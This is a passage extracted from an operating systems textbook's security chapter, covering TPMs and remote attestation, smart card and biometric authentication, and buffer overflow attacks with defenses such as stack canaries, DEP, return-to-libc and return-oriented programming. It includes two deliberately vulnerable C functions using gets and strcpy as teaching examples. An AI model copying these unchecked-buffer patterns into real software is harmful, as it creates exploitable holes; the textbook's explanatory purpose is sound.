            "content": "9.5.5 Trusted Platform Modules\r\nAll cryptography requires keys. If the keys are compromised, all the security\r\nbased on them is also compromised. Storing the keys securely is thus essential.\r\nHow does one store keys securely on a system that is not secure?\r\nOne proposal that the industry has come up with is a chip called the TPM\r\n(Trusted Platform Module), which is a cryptoprocessor with some nonvolatile\r\nstorage inside it for keys. The TPM can perform cryptographic operations such as\r\nencrypting blocks of plaintext or decrypting blocks of ciphertext in main memory.\r\nIt can also verify digital signatures. When all these operations are done in spe\u0002cialized hardware, they become much faster and are likely to be used more widely.\nSEC. 9.5 BASICS OF CRYPTOGRAPHY 625\r\nMany computers already have TPM chips and many more are likely to have them\r\nin the future.\r\nTPM is extremely controversial because different parties have different ideas\r\nabout who will control the TPM and what it will protect from whom. Microsoft has\r\nbeen a big advocate of this concept and has developed a series of technologies to\r\nuse it, including Palladium, NGSCB, and BitLocker. In its view, the operating sys\u0002tem controls the TPM and uses it for instance to encrypt the hard drive. Howev er, it\r\nalso wants to use the TPM to prevent unauthorized software from being run.\r\n‘‘Unauthorized software’’ might be pirated (i.e., illegally copied) software or just\r\nsoftware the operating system does not authorize. If the TPM is involved in the\r\nbooting process, it might start only operating systems signed by a secret key placed\r\ninside the TPM by the manufacturer and disclosed only to selected operating sys\u0002tem vendors (e.g., Microsoft). Thus the TPM could be used to limit users’ choices\r\nof software to those approved by the computer manufacturer.\r\nThe music and movie industries are also very keen on TPM as it could be used\r\nto prevent piracy of their content. It could also open up new business models, such\r\nas renting songs or movies for a specific period of time by refusing to decrypt them\r\nafter the expiration date.\r\nOne interesting use for TPMs is known as remote attestation. Remote attesta\u0002tion allows an external party to verify that the computer with the TPM runs the\r\nsoftware it should be running, and not something that cannot be trusted. The idea is\r\nthat the attesting party uses the TPM to create ‘‘measurements’’ that consist of\r\nhashes of the configuration. For instance, let us assume that the external party\r\ntrusts nothing on our machine, except the BIOS. If the (external) challenging party\r\nwere able to verify that we ran a trusted bootloader and not some rogue piece of\r\nsoftware, this would be a start. If we could additionally prove that we ran a legiti\u0002mate kernel on this trustworthy bootloader, even better. And if we could finally\r\nshow that on this kernel we ran the right version of a legitimate application, the\r\nchallenging party might be satisfied with respect to our trustworthiness.\r\nLet us first consider what happens on our machine, from the moment it boots.\r\nWhen the (trusted) BIOS starts, it first initializes the TPM and uses it to create a\r\nhash of the code in memory after loading the bootloader. The TPM writes the re\u0002sult in a special register, known as a PCR (Platform Configuration Register).\r\nPCRs are special because they cannot be overwritten directly—but only ‘‘ex\u0002tended.’’ To extend the PCR, the TPM takes a hash of the combination of the input\r\nvalue and the previous value in the PCR, and stores that in the PCR. Thus, if our\r\nbootloader is benign, it will take a measurement (create a hash) for the loaded ker\u0002nel and extend the PCR that previously contained the measurement for the boot\u0002loader itself. Intuitively, we may consider the resulting cryptographic hash in the\r\nPCR as a hash chain, which binds the kernel to the bootloader. Now the kernel in\r\nturn creates takes a measurement of the application and extends the PCR with that.\r\nNow let us consider what happens when an external party wants to verify that\r\nwe run the right (trustworthy) software stack and not some arbitrary other code.\n626 SECURITY CHAP. 9\r\nFirst, the challenging party creates an unpredictable value of, for example, 160\r\nbits. This value, known as a nonce, is simply a unique identifier for this verifica\u0002tion request. It serves to prevent an attacker from recording the response to one re\u0002mote attestation request, changing the configuration on the attesting party and then\r\nsimply replaying the previous response for all subsequent attestation requests. By\r\nincorporating a nonce in the protocol, such replays are not possible. When the\r\nattesting side receives the attestation request (with the nonce), it uses the TPM to\r\ncreate a signature (with its unique and unforgeable key) for the concatenation of\r\nthe nonce and the value of the PCR. It then sends back this signature, the nonce,\r\nthe value of the PCR, and hashes for the bootloader, the kernel, and the application.\r\nThe challenging party first checks the signature and the nonce. Next, it looks up\r\nthe three hashes in its database of trusted bootloaders, kernels, and applications. If\r\nthey are not there, the attestation fails. Otherwise, the challenging party re-creates\r\nthe combined hash of all three components and compares it to the value of the PCR\r\nreceived from the attesting side. If the values match, the challenging side is sure\r\nthat the attesting side was started with exactly those three components. The signed\r\nresult prevents attackers from forging the result, and since we know that the trusted\r\nbootloader performs the appropriate measurement of the kernel and the kernel in\r\nturn measures the application, no other code configuration could have produced the\r\nsame hash chain.\r\nTPM has a variety of other uses that we do not have space to get into. Inter\u0002estingly enough, the one thing TPM does not do is make computers more secure\r\nagainst external attacks. What it really focuses on is using cryptography to prevent\r\nusers from doing anything not approved directly or indirectly by whoever controls\r\nthe TPM. If you would like to learn more about this subject, the article on Trusted\r\nComputing in the Wikipedia is a good place to start."
          }
        }
      },
      "9.6 AUTHENTICATION": {
        "page": 657,
        "children": {
          "9.6.1 Authentication Using a Physical Object": {
            "page": 664,
            "content": "9.6.1 Authentication Using a Physical Object\r\nThe second method for authenticating users is to check for some physical ob\u0002ject they hav e rather than something they know. Metal door keys hav e been used\r\nfor centuries for this purpose. Nowadays, the physical object used is often a plastic\r\ncard that is inserted into a reader associated with the computer. Normally, the user\r\nmust not only insert the card, but must also type in a password, to prevent someone\r\nfrom using a lost or stolen card. Viewed this way, using a bank’s ATM (Automated\r\nTeller Machine) starts out with the user logging in to the bank’s computer via a re\u0002mote terminal (the ATM machine) using a plastic card and a password (currently a\r\n4-digit PIN code in most countries, but this is just to avoid the expense of putting a\r\nfull keyboard on the ATM machine).\r\nInformation-bearing plastic cards come in two varieties: magnetic stripe cards\r\nand chip cards. Magnetic stripe cards hold about 140 bytes of information written\r\non a piece of magnetic tape glued to the back of the card. This information can be\r\nread out by the terminal and then sent to a central computer. Often the information\n634 SECURITY CHAP. 9\r\ncontains the user’s password (e.g., PIN code) so the terminal can perform an identi\u0002ty check even if the link to the main computer is down. Typically the password is\r\nencrypted by a key known only to the bank. These cards cost about $0.10 to $0.50,\r\ndepending on whether there is a hologram sticker on the front and the production\r\nvolume. As a way to identify users in general, magnetic stripe cards are risky be\u0002cause the equipment to read and write them is cheap and widespread.\r\nChip cards contain a tiny integrated circuit (chip) on them. These cards can be\r\nsubdivided into two categories: stored value cards and smart cards. Stored value\r\ncards contain a small amount of memory (usually less than 1 KB) using ROM\r\ntechnology to allow the value to be remembered when the card is removed from\r\nthe reader and thus the power turned off. There is no CPU on the card, so the value\r\nstored must be changed by an external CPU (in the reader). These cards are mass\r\nproduced by the millions for well under $1 and are used, for example, as prepaid\r\ntelephone cards. When a call is made, the telephone just decrements the value in\r\nthe card, but no money actually changes hands. For this reason, these cards are\r\ngenerally issued by one company for use on only its machines (e.g., telephones or\r\nvending machines). They could be used for login authentication by storing a 1-KB\r\npassword in them that the reader would send to the central computer, but this is\r\nrarely done.\r\nHowever, now adays, much security work is being focused on the smart cards\r\nwhich currently have something like a 4-MHz 8-bit CPU, 16 KB of ROM, 4 KB of\r\nROM, 512 bytes of scratch RAM, and a 9600-bps communication channel to the\r\nreader. The cards are getting smarter in time, but are constrained in a variety of\r\nways, including the depth of the chip (because it is embedded in the card), the\r\nwidth of the chip (so it does not break when the user flexes the card) and the cost\r\n(typically $1 to $20, depending on the CPU power, memory size, and presence or\r\nabsence of a cryptographic coprocessor).\r\nSmart cards can be used to hold money, as do stored value cards, but with\r\nmuch better security and universality. The cards can be loaded with money at an\r\nATM machine or at home over the telephone using a special reader supplied by the\r\nbank. When inserted into a merchant’s reader, the user can authorize the card to\r\ndeduct a certain amount of money from the card (by typing YES), causing the card\r\nto send a little encrypted message to the merchant. The merchant can later turn the\r\nmessage over to a bank to be credited for the amount paid.\r\nThe big advantage of smart cards over, say, credit or debit cards, is that they do\r\nnot need an online connection to a bank. If you do not believe this is an advantage,\r\ntry the following experiment. Try to buy a single candy bar at a store and insist on\r\npaying with a credit card. If the merchant objects, say you have no cash with you\r\nand besides, you need the frequent flyer miles. You will discover that the merchant\r\nis not enthusiastic about the idea (because the associated costs dwarf the profit on\r\nthe item). This makes smart cards useful for small store purchases, parking meters,\r\nvending machines, and many other devices that normally require coins. They are in\r\nwidespread use in Europe and spreading elsewhere.\nSEC. 9.6 AUTHENTICATION 635\r\nSmart cards have many other potentially valuable uses (e.g., encoding the\r\nbearer’s allergies and other medical conditions in a secure way for use in emergen\u0002cies), but this is not the place to tell that story. Our interest here is how they can be\r\nused for secure login authentication. The basic concept is simple: a smart card is a\r\nsmall, tamperproof computer that can engage in a discussion (protocol) with a\r\ncentral computer to authenticate the user. For example, a user wishing to buy\r\nthings at an e-commerce Website could insert a smart card into a home reader at\u0002tached to his PC. The e-commerce site would not only use the smart card to auth\u0002enticate the user in a more secure way than a password, but could also deduct the\r\npurchase price from the smart card directly, eliminating a great deal of the over\u0002head (and risk) associated with using a credit card for online purchases.\r\nVarious authentication schemes can be used with a smart card. A particularly\r\nsimple challenge-response works like this. The server sends a 512-bit random\r\nnumber to the smart card, which then adds the user’s 512-bit password stored in\r\nthe card’s ROM to it. The sum is then squared and the middle 512 bits are sent\r\nback to the server, which knows the user’s password and can compute whether the\r\nresult is correct or not. The sequence is shown in Fig. 9-19. If a wiretapper sees\r\nboth messages, he will not be able to make much sense out of them, and recording\r\nthem for future use is pointless because on the next login, a different 512-bit ran\u0002dom number will be sent. Of course, a much fancier algorithm than squaring can\r\nbe used, and always is.\r\n1. Challenge sent to smart card\r\n3. Response sent back\r\nRemote\r\ncomputer\r\nSmart\r\ncard\r\n2. Smart\r\n card\r\n computes\r\n response Smart\r\ncard\r\nreader\r\nFigure 9-19. Use of a smart card for authentication.\r\nOne disadvantage of any fixed cryptographic protocol is that over the course of\r\ntime it could be broken, rendering the smart card useless. One way to avoid this\r\nfate is to use the ROM on the card not for a cryptographic protocol, but for a Java\r\ninterpreter. The real cryptographic protocol is then downloaded onto the card as a\r\nJava binary program and run interpretively. In this way, as soon as one protocol is\r\nbroken, a new one can be installed worldwide in a straightforward way: next time\n636 SECURITY CHAP. 9\r\nthe card is used, new software is installed on it. A disadvantage of this approach is\r\nthat it makes an already slow card even slower, but as technology improves, this\r\nmethod is very flexible. Another disadvantage of smart cards is that a lost or stolen\r\none may be subject to a side-channel attack, for example a power analysis attack.\r\nBy observing the electric power consumed during repeated encryption operations,\r\nan expert with the right equipment may be able to deduce the key. Measuring the\r\ntime to encrypt with various specially chosen keys may also provide valuable\r\ninformation about the key."
          },
          "9.6.2 Authentication Using Biometrics": {
            "page": 667,
            "content": "9.6.2 Authentication Using Biometrics\r\nThe third authentication method measures physical characteristics of the user\r\nthat are hard to forge. These are called biometrics (Boulgouris et al., 2010; and\r\nCampisi, 2013). For example, a fingerprint or voiceprint reader hooked up to the\r\ncomputer could verify the user’s identity.\r\nA typical biometrics system has two parts: enrollment and identification. Dur\u0002ing enrollment, the user’s characteristics are measured and the results digitized.\r\nThen significant features are extracted and stored in a record associated with the\r\nuser. The record can be kept in a central database (e.g., for logging in to a remote\r\ncomputer), or stored on a smart card that the user carries around and inserts into a\r\nremote reader (e.g., at an ATM machine).\r\nThe other part is identification. The user shows up and provides a login name.\r\nThen the system makes the measurement again. If the new values match the ones\r\nsampled at enrollment time, the login is accepted; otherwise it is rejected. The\r\nlogin name is needed because the measurements are never exact, so it is difficult to\r\nindex them and then search the index. Also, two people might have the same char\u0002acteristics, so requiring the measured characteristics to match those of a specific\r\nuser is stronger than just requiring them to match those of any user.\r\nThe characteristic chosen should have enough variability that the system can\r\ndistinguish among many people without error. For example, hair color is not a\r\ngood indicator because too many people share the same color. Also, the charac\u0002teristic should not vary over time and with some people, hair color does not have\r\nthis property. Similarly a person’s voice may be different due to a cold and a face\r\nmay look different due to a beard or makeup not present at enrollment time. Since\r\nlater samples are never going to match the enrollment values exactly, the system\r\ndesigners have to decide how good the match has to be to be accepted. In particu\u0002lar, they hav e to decide whether it is worse to reject a legitimate user once in a\r\nwhile or let an imposter get in once in a while. An e-commerce site might decide\r\nthat rejecting a loyal customer might be worse than accepting a small amount of\r\nfraud, whereas a nuclear weapons site might decide that refusing access to a gen\u0002uine employee was better than letting random strangers in twice a year.\r\nNow let us take a brief look at some of the biometrics that are in actual use.\r\nFinger-length analysis is surprisingly practical. When this is used, each computer\nSEC. 9.6 AUTHENTICATION 637\r\nhas a device like the one of Fig. 9-20. The user inserts his hand into it, and the\r\nlength of all his fingers is measured and checked against the database.\r\nSpring\r\nPressure plate\r\nFigure 9-20. A device for measuring finger length.\r\nFinger-length measurements are not perfect, however. The system can be at\u0002tacked with hand molds made out of plaster of Paris or some other material, pos\u0002sibly with adjustable fingers to allow some experimentation.\r\nAnother biometric that is in widespread commercial use is iris recognition.\r\nNo two people have the same patterns (even identical twins), so iris recognition is\r\nas good as fingerprint recognition and more easily automated (Daugman, 2004).\r\nThe subject just looks at a camera (at a distance of up to 1 meter), which pho\u0002tographs the subject’s eyes, extracts certain characteristics by performing what is\r\ncalled a gabor wavelet transformation, and compresses the results to 256 bytes.\r\nThis string is compared to the value obtained at enrollment time, and if the Ham\u0002ming distance is below some critical threshold, the person is authenticated. (The\r\nHamming distance between two bit strings is the minimum number of changes\r\nneeded to transform one into the other.)\r\nAny technique that relies on images is subject to spoofing. For example, a per\u0002son could approach the equipment (say, an ATM machine camera) wearing dark\r\nglasses to which photographs of someone else’s eyes were attached. After all, if the\r\nATM’s camera can take a good iris photo at 1 meter, other people can do it too, and\r\nat greater distances using telephoto lenses. For this reason, countermeasures may\r\nbe needed such as having the camera fire a flash, not for illumination purposes, but\r\nto see if the pupil contracts in response or to see if the amateur photographer’s\r\ndreaded red-eye effect shows up in the flash picture but is absent when no flash is\n638 SECURITY CHAP. 9\r\nused. Amsterdam Airport has been using iris recognition technology since 2001 to\r\nenable frequent travelers to bypass the normal immigration line.\r\nA somewhat different technique is signature analysis. The user signs his name\r\nwith a special pen connected to the computer, and the computer compares it to a\r\nknown specimen stored online or on a smart card. Even better is not to compare the\r\nsignature, but compare the pen motions and pressure made while writing it. A\r\ngood forger may be able to copy the signature, but will not have a clue as to the\r\nexact order in which the strokes were made or at what speed and what pressure.\r\nA scheme that relies on minimal special hardware is voice biometrics (Kaman\r\net al., 2013). All that is needed is a microphone (or even a telephone); the rest is\r\nsoftware. In contrast to voice recognition systems, which try to determine what the\r\nspeaker is saying, these systems try to determine who the speaker is. Some systems\r\njust require the user to say a secret password, but these can be defeated by an\r\neavesdropper who can record passwords and play them back later. More advanced\r\nsystems say something to the user and ask that it be repeated back, with different\r\ntexts used for each login. Some companies are starting to use voice identification\r\nfor applications such as home shopping over the telephone because voice identifi\u0002cation is less subject to fraud than using a PIN code for identification. Voice\r\nrecognition can be combined with other biometrics such as face recognition for\r\nbetter accuracy (Tresadern et al., 2013).\r\nWe could go on and on with more examples, but two more will help make an\r\nimportant point. Cats and other animals mark off their territory by urinating around\r\nits perimeter. Apparently cats can identify each other’s smell this way. Suppose\r\nthat someone comes up with a tiny device capable of doing an instant urinalysis,\r\nthereby providing a foolproof identification. Each computer could be equipped\r\nwith one of these devices, along with a discreet sign reading: ‘‘For login, please\r\ndeposit sample here.’’ This might be an absolutely unbreakable system, but it\r\nwould probably have a fairly serious user acceptance problem.\r\nWhen the above paragraph was included in an earlier edition of this book, it\r\nwas intended at least partly as a joke. No more. In an example of life imitating art\r\n(life imitating textbooks?), researchers have now dev eloped odor-recognition sys\u0002tems that could be used as biometrics (Rodriguez-Lujan et al., 2013). Is Smell-O\u0002Vision next?\r\nAlso potentially problematical is a system consisting of a thumbtack and a\r\nsmall spectrograph. The user would be requested to press his thumb against the\r\nthumbtack, thus extracting a drop of blood for spectrographic analysis. So far,\r\nnobody has published anything on this, but there is work on blood vessel imaging\r\nas a biometric (Fuksis et al., 2011).\r\nOur point is that any authentication scheme must be psychologically ac\u0002ceptable to the user community. Finger-length measurements probably will not\r\ncause any problem, but even something as nonintrusive as storing fingerprints on\r\nline may be unacceptable to many people because they associate fingerprints with\r\ncriminals. Nevertheless, Apple introduced the technology on the iPhone 5S.\nSEC."
          }
        }
      },
      "9.7 EXPLOITING SOFTWARE": {
        "page": 670,
        "children": {
          "9.7.1 Buffer Overflow Attacks": {
            "page": 671,
            "content": "9.7.1 Buffer Overflow Attacks\r\nOne rich source of attacks has been due to the fact that virtually all operating\r\nsystems and most systems programs are written in the C or C++ programming lan\u0002guages (because programmers like them and they can be compiled to extremely ef\u0002ficient object code). Unfortunately, no C or C++ compiler does array bounds\r\nchecking. As an example, the C library function gets, which reads a string (of\r\nunknown size) into a fixed-size buffer, but without checking for overflow, is notori\u0002ous for being subject to this kind of attack (some compilers even detect the use of\r\ngets and warn about it). Consequently, the following code sequence is also not\r\nchecked:\r\n01. void A( ) {\r\n02. char B[128]; /* reser ve a buffer with space for 128 bytes on the stack */\r\n03. printf (\"Type log message:\");\r\n04. gets (B); /* read log message from standard input into buffer */\r\n05. writeLog (B); /* output the string in a pretty for mat to the log file */\r\n06. }\r\nFunction A represents a logging procedure—somewhat simplified. Every time\r\nthe function executes, it invites the user to type in a log message and then reads\r\nwhatever the user types in the buffer B, using the gets from the C library. Finally, it\r\ncalls the (homegrown) writeLog function that presumably writes out the log entry\r\nin an attractive format (perhaps adding a date and time to the log message to make\nSEC. 9.7 EXPLOITING SOFTWARE 641\r\nit easier to search the log later). Assume that function A is part of a privileged proc\u0002ess, for instance a program that is SETUID root. An attacker who is able to take\r\ncontrol of such a process, essentially has root privileges himself.\r\nThe code above has a severe bug, although it may not be immediately obvious.\r\nThe problem is caused by the fact that gets reads characters from standard input\r\nuntil it encounters a newline character. It has no idea that buffer B can hold only\r\n128 bytes. Suppose the user types a line of 256 characters. What happens to the\r\nremaining 128 bytes? Since gets does not check for buffer bounds violations, the\r\nremaining bytes will be stored on the stack also, as if the buffer were 256 bytes\r\nlong. Everything that was originally stored at these memory locations is simply\r\noverwritten. The consequences are typically disastrous.\r\nIn Fig. 9-21(a), we see the main program running, with its local variables on\r\nthe stack. At some point it calls the procedure A, as shown in Fig. 9-21(b). The\r\nstandard calling sequence starts out by pushing the return address (which points to\r\nthe instruction following the call) onto the stack. It then transfers control to A,\r\nwhich decrements the stack pointer by 128 to allocate storage for its local variable\r\n(buffer B).\r\nMain’s\r\nlocal\r\n variables\r\nProgram\r\n(a)\r\n0xFFFF...\r\nStack\r\npointer\r\nVirtual address space\r\nStack\r\nMain’s\r\nlocal\r\nvariables\r\nProgram\r\nReturn addr\r\n(b)\r\nSP\r\nVirtual address space\r\nB\r\nProgram\r\n(c)\r\nSP\r\nVirtual address space\r\nB\r\nA’s local\r\nvariables\r\nBuffer B\r\nMain’s\r\nlocal\r\nvariables\r\nReturn addr\r\nA’s local\r\nvariables\r\nFigure 9-21. (a) Situation when the main program is running. (b) After the pro\u0002cedure A has been called. (c) Buffer overflow shown in gray.\r\nSo what exactly will happen if the user provides more than 128 characters?\r\nFigure 9-21(c) shows this situation. As mentioned, the gets function copies all the\r\nbytes into and beyond the buffer, overwriting possibly many things on the stack,\r\nbut in particular overwriting the return address pushed there earlier. In other words,\r\npart of the log entry now fills the memory location that the system assumes to hold\r\nthe address of the instruction to jump to when the function returns. As long as the\r\nuser typed in a regular log message, the characters of the message would probably\n642 SECURITY CHAP. 9\r\nnot represent a valid code address. As soon as the function A returns, the progam\r\nwould try to jump to an invalid target—something the system would not like at all.\r\nIn most cases, the program would crash immediately.\r\nNow assume that this is not a benign user who provides an overly long mes\u0002sage by mistake, but an attacker who provides a tailored messsage specifically\r\naimed at subverting the program’s control flow. Say the attacker provides an input\r\nthat is carefully crafted to overwrite the return address with the address of buffer B.\r\nThe result is that upon returning from function A, the program will jump to the be\u0002ginning of buffer B and execute the bytes in the buffer as code. Since the attacker\r\ncontrols the content of the buffer, he can fill it with machine instructions—to ex\u0002ecute the attacker’s code within the context of the original program. In effect, the\r\nattacker has overwritten memory with his own code and gotten it executed. The\r\nprogram is now completely under the attacker’s control. He can make it do what\u0002ev er he wants. Often, the attacker code is used to launch a shell (for instance by\r\nmeans of the exec system call), enabling the intruder convenient access to the ma\u0002chine. For this reason, such code is commonly known as shellcode, even if it does\r\nnot spawn a shell.\r\nThis trick works not just for programs using gets (although you should really\r\navoid using that function), but for any code that copies user-provided data in a\r\nbuffer without checking for boundary violations. This user data may consist of\r\ncommand-line parameters, environment strings, data sent over a network con\u0002nection, or data read from a user file. There are many functions that copy or move\r\nsuch data: strcpy, memcpy, strcat, and many others. Of course, any old loop that\r\nyou write yourself and that moves bytes into a buffer may be vulnerable as well.\r\nWhat if the attacker does not know the exact address to return to? Often an at\u0002tacker can guess where the shellcode resides approximately, but not exactly. In\r\nthat case, a typical solution is to prepend the shellcode with a nop sled: a sequence\r\nof one-byte NO OPERATION instructions that do not do anything at all. As long as\r\nthe attacker manages to land anywhere on the nop sled, the execution will eventu\u0002ally also reach the real shellcode at the end. Nop sleds work on the stack, but also\r\non the heap. On the heap, attackers often try to increase their chances by placing\r\nnop sleds and shellcode all over the heap. For instance, in a browser, malicious\r\nJavaScript code may try to allocate as much memory as it can and fill it with a long\r\nnop sled and a small amount of shellcode. Then, if the attacker manages to divert\r\nthe control flow and aims for a random heap address, chances are that he will hit\r\nthe nop sled. This technique is known as heap spraying.\r\nStack Canaries\r\nOne commonly used defense against the attack sketched above is to use stack\r\ncanaries. The name derives from the mining profession. Working in a mine is\r\ndangerous work. Toxic gases like carbon monoxide may build up and killl the min\u0002ers. Moreover, carbon monoxide is odorless, so the miners might not even notice it.\nSEC. 9.7 EXPLOITING SOFTWARE 643\r\nIn the past, miners therefore brought canaries into the mine as early warning sys\u0002tems. Any build up of toxic gases would kill the canary before harming its owner.\r\nIf your bird died, it was probably time to go up.\r\nModern computer systems still use (digital) canaries as early warning systems.\r\nThe idea is very simple. At places where the program makes a function call, the\r\ncompiler inserts code to save a random canary value on the stack, just below the re\u0002turn address. Upon a return from the function, the compiler inserts code to check\r\nthe value of the canary. If the value changed, something is wrong. In that case, it is\r\nbetter to hit the panic button and crash rather than continuing.\r\nAv oiding Stack Canaries\r\nCanaries work well against attacks like the one above, but many buffer over\u0002flows are still possible. For instance, consider the code snippet in Fig. 9-22. It uses\r\ntwo new functions. The strcpy is a C library function to copy a string into a buffer,\r\nwhile the strlen determines the length of a string.\r\n01. void A (char *date) {\r\n02. int len;\r\n03. char B [128];\r\n04. char logMsg [256];\r\n05.\r\n06. strcpy (logMsg, date); /* first copy the string with the date in the log message */\r\n07. len = str len (date); /* deter mine how many characters are in the date string */\r\n08. gets (B); /* now get the actual message */\r\n09. strcpy (logMsg+len, B); /* and copy it after the date into logMessage */\r\n10. writeLog (logMsg); /* finally, write the log message to disk */\r\n11. }\r\nFigure 9-22. Skipping the stack canary: by modifying len first, the attack is able\r\nto bypass the canary and modify the return address directly.\r\nAs in the previous example, function A reads a log message from standard\r\ninput, but this time it explicitly prepends it with the current date (provided as a\r\nstring argument to function A). First, it copies the date into the log message\r\n(line 6). A date string may have different length, depending on the day of the week,\r\nthe month, etc. For instance, Friday has 5 letters, but Saturday 8. Same thing for\r\nthe months. So, the second thing it does, is determine how many characters are in\r\nthe date string (line 7). Then it gets the user input (line 5) and copies it into the log\r\nmessage, starting just after the date string. It does this by specifying that the desti\u0002nation of the copy should be the start of the log message plus the length of the date\r\nstring (line 9). Finally, it writes the log to disk as before.\n644 SECURITY CHAP. 9\r\nLet us suppose the system uses stack canaries. How could we possibly change\r\nthe return address? The trick is that when the attacker overflows buffer B, he does\r\nnot try to hit the return address immediately. Instead, he modifies the variable len\r\nthat is located just above it on the stack. In line 9, len serves as an offset that deter\u0002mines where the contents of buffer B will be written. The programmer’s idea was\r\nto skip only the date string, but since the attacker controls len, he may use it to skip\r\nthe canary and overwrite the return address.\r\nMoreover, buffer overflows are not limited to the return address. Any function\r\npointer that is reachable via an overflow is fair game. A function pointer is just like\r\na regular pointer, except that it points to a function instead of data. For instance, C\r\nand C++ allow a programmer to declare a variable f as a pointer to a function that\r\ntakes a string argument and returns no result, as follows:\r\nvoid (*f)(char*);\r\nThe syntax is perhaps a bit arcane, but it is really just another variable declaration.\r\nSince function A of the previous example matches the above signature, we can now\r\nwrite ‘‘f=A’’ and use f instead of A in our program. It is beyond this book to go\r\ninto function pointers in great detail, but rest assured that function pointers are\r\nquite common in operating systems. Now suppose the attacker manages to over\u0002write a function pointer. As soon as the program calls the function using the func\u0002tion pointer, it would really call the code injected by the attacker. For the exploit to\r\nwork, the function pointer need not even be on the stack. Function pointers on the\r\nheap are just as useful. As long as the attacker can change the value of a function\r\npointer or a return address to the buffer that contains the attacker’s code, he is able\r\nto change the program’s flow of control.\r\nData Execution Prev ention\r\nPerhaps by now you may exclaim: ‘‘Wait a minute! The real cause of the prob\u0002lem is not that the attacker is able to overwrite function pointers and return ad\u0002dresses, but the fact that he can inject code and have it executed. Why not make it\r\nimpossible to execute bytes on the heap and the stack?’’ If so, you had an epiphany.\r\nHowever, we will see shortly that epiphanies do not always stop buffer overflow at\u0002tacks. Still, the idea is pretty good. Code injection attacks will no longer work if\r\nthe bytes provided by the attacker cannot be executed as legitimate code.\r\nModern CPUs have a feature that is popularly referred to as the NX bit, which\r\nstands for ‘‘No-eXecute.’’ It is extremely useful to distinguish between data seg\u0002ments (heap, stack, and global variables) and the text segment (which contains the\r\ncode). Specifically, many modern operating systems try to ensure that data seg\u0002ments are writable, but are not executable, and the text segment is executable, but\r\nnot writable. This policy is known on OpenBSD as WˆX (pronounced as ‘‘W\r\nExclusive-OR X’’) or ‘‘W XOR X’’). It signifies that memory is either writable or\r\nexecutable, but not both. Mac OS X, Linux, and Windows have similar protection\nSEC. 9.7 EXPLOITING SOFTWARE 645\r\nschemes. A generic name for this security measure is DEP (Data Execution Pre\u0002vention). Some hardware does not support the NX bit. In that case, DEP still\r\nworks but the enforcement takes place in software.\r\nDEP prevents all of the attacks discussed so far. The attacker can inject as\r\nmuch shellcode into the process as much as he wants. Unless he is able to make the\r\nmemory executable, there is no way to run it.\r\nCode Reuse Attacks\r\nDEP makes it impossible to execute code in a data region. Stack canaries make\r\nit harder (but not impossible) to overwrite return addresses and function pointers.\r\nUnfortunately, this is not the end of the story, because somewhere along the line,\r\nsomeone else had an epiphany too. The insight was roughly as follows: ‘‘Why\r\ninject code, when there is plenty of it in the binary already?’’ In other words, rather\r\nthan introducing new code, the attacker simply constructs the necessary func\u0002tionality out of the existing functions and instructions in the binaries and libraries.\r\nWe will first look at the simplest of such attacks, return to libc, and then discuss\r\nthe more complex, but very popular, technique of return-oriented programming.\r\nSuppose that the buffer overflow of Fig. 9-22 has overwritten the return ad\u0002dress of the current function, but cannot execute attacker-supplied code on the\r\nstack. The question is: can it return somewhere else? It turns out it can. Almost all\r\nC programs are linked with the (usually shared) library libc, which contains key\r\nfunctions most C programs need. One of these functions is system, which takes a\r\nstring as argument and passes it to the shell for execution. Thus, using the system\r\nfunction, an attacker can execute any program he wants. So, instead of executing\r\nshellcode, the attacker simply place a string containing the command to execute on\r\nthe stack, and diverts control to the system function via the return address.\r\nThe attack is known as return to libc and has several variants. System is not\r\nthe only function that may be interesting to the attacker. For instance, attackers\r\nmay also use the mprotect function to make part of the data segment executable. In\r\naddition, rather than jumping to the libc function directly, the attack may take a\r\nlevel of indirection. On Linux, for instance, the attacker may return to the PLT\r\n(Procedure Linkage Table) instead. The PLT is a structure to make dynamic link\u0002ing easier, and contains snippets of code that, when executed, in turn call the dy\u0002namically linked library functions. Returning to this code then indirectly executes\r\nthe library function.\r\nThe concept of ROP (Return-Oriented Programming) takes the idea of\r\nreusing the program’s code to its extreme. Rather than return to (the entry points\r\nof) library functions, the attacker can return to any instruction in the text segment.\r\nFor instance, he can make the code land in the middle, rather than the beginning, of\r\na function. The execution will simply continue at that point, one instruction at a\r\ntime. Say that after a handful of instructions, the execution encounters another re\u0002turn instruction. Now, we ask the same question once again: where can we return\n646 SECURITY CHAP. 9\r\nto? Since the attacker has control over the stack, he can again make the code return\r\nanywhere he wants to. Moreover, after he has done it twice, he may as well do it\r\nthree times, or four, or ten, etc.\r\nThus, the trick of return-oriented programming is to look for small sequences\r\nof code that (a) do something useful, and (b) end with a return instruction. The at\u0002tacker can string together these sequences by means of the return addresses he\r\nplaces on the stack. The individual snippets are called gadgets. Typically, they\r\nhave very limited functionality, such as adding two registers, loading a value from\r\nmemory into a register, or pushing a value on the stack. In other words, the collec\u0002tion of gadgets can be seen as a very strange instruction set that the attacker can\r\nuse to build aribtary functionality by clever manipulation of the stack. The stack\r\npointer, meanwhile, serves as a slightly bizarre kind of program counter.\r\n&gadget C\r\n&gadget B\r\n&gadget A\r\ndata\r\ndata\r\nRET\r\ninstr 4\r\ninstr 2\r\ninstr 1\r\ninstr 3\r\ngadget C\r\n(part of function Z)\r\nRET\r\ninstr 2\r\ninstr 1\r\ninstr 3\r\ngadget B\r\n(part of function Y)\r\nRET\r\ninstr 4\r\ninstr 2\r\ninstr 1\r\ninstr 3\r\ngadget A\r\n(part of function X)\r\nText segment\r\nStack\r\nGadget A:\r\n- pop operand off the stack into register 1\r\n- if the value is negative, jump to error handler\r\n- otherwise return\r\nGadget B:\r\n- pop operand off the stack into register 2\r\n- return\r\nGadget C:\r\n- multiply register 1 by 4\r\n- push register 1\r\n- add register 2 to the value on the top of the stack\r\n and store the result in register 2\r\nExample gadgets:\r\n(a) (b)\r\nFigure 9-23. Return-oriented programming: linking gadgets.\r\nFigure 9-23(a) shows an example of how gadgets are linked together by return\r\naddresses on the stack. The gadgets are short snippets of code that end with a re\u0002turn instruction. The return instruction will pop the address to return to off the\r\nstack and continue execution there. In this case, the attacker first returns to gadget\r\nA in some function X, then to gadget B in function Y, etc. It is the attacker’s job to\r\ngather these gadgets in an existing binary. As he did not create the gadgets him\u0002self, he sometimes has to make do with gadgets that are perhaps less than ideal, but\nSEC. 9.7 EXPLOITING SOFTWARE 647\r\ngood enough for the job. For instance, Fig. 9-23(b) suggests that gadget A has a\r\ncheck as part of the instruction sequence. The attacker may not care for the check\r\nat all, but since it is there, he will have to accept it. For most purposes, it is 